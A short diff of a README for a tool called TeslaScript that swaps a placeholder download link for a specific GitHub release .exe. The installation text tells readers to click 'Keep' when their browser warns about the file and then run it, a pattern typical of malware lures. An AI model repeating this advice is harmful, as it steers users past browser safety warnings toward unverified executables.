@@ -28,7 +28,7 @@ Click <a href="https://teslascript.pages.dev">here</a> to access the official Te
 ## 📥 Installation
 
 **1. Download the latest installer:**  
-➡️ [TeslaScript Releases](https://github.com/yourusername/teslascript/releases/TeslaScript.exe)
+➡️ [TeslaScript Releases](https://github.com/Nirajan-Abhilash/TeslaScript/releases/TeslaScript.exe)
 > The browser you are using may warn you because TeslaScript is new. Click  **"Keep"** and move on to the next step.
 
 **2. Run the executable:**
